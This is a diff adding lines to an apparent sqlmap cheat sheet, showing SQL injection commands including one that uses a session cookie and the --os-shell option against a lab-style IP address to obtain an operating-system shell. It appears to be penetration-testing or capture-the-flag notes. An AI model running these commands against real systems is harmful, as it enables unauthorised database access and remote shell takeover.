@@ -81,6 +81,9 @@ We can provide the data being passed in the POST request body to scan by the SQL
 sqlmap -u http://site-to-test.com/admin/index.php –data=”user=admin&password=admin” -p user
 
 –data = POST data
+
+PHP + SQL parameter (with cookie authentification)
+sqlmap --cookie=PHPSESSID=0r7rr0vcsrekau1453acmvdrg5 --os-shell -u http://10.129.7.81/dashboard.php?search=a
 ```
 **Use --os-shell Prompt for an interactive operating system shell**
 
